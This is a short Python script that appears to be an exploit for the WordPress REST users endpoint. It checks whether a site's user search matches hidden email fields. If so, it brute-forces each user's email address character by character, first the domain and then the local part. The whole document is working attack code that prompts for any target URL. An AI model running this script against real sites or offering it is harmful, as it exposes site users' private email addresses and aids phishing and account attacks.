#!/usr/bin/python3

import sys
import requests
import json

alphabet = "abcdefghijklmnopqrstuvwxyz0123456789._-"
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}

def check(url, search):
	res = json.loads(requests.get(url + "?search=" + search, headers=headers).content.decode('utf-8'))
	return len(res) > 0


def check_vulnerability(url):
	try:
		res = json.loads(requests.get(url + "?search=@", headers=headers).content.decode('utf-8'))
	except:
		return False

	for i in res:
		if "@" not in str(i['id']) + i['name'] + i['slug']:
			user_count = len(res)
			print("[i] Target is vulnerable. ")
			print("[i] Number of users: " + str(user_count) + "\n")
			return True
	return False


def brute_email_domain(url):
	domain = "@"
	while True:
		success = False
		for i in alphabet:
			#print("Trying: " + i)
			if check(url, domain + i):
				success = True
				domain += i
				sys.stdout.write("\rEmail: %s" % domain)
				break
		if not success:
			break

	return domain


def brute_email(url, domain):
	email_address = domain

	while True:
		success = False
		for i in alphabet:
			#print("Trying:" + i)
			if check(url, i + email_address):
				success = True
				email_address = i + email_address
				sys.stdout.write("\rEmail: %s" % email_address)
				break
		if not success:
			break


if __name__ == "__main__":
	target = input("Enter site URL (https://blog.example.com): ")
	url = target + "/wp-json/wp/v2/users"
	if not check_vulnerability(url):
		print("[!] Site does not appear to be vulnerable.")
		exit()
	else:
		domain = brute_email_domain(url)
		brute_email(url, domain)
		print("")
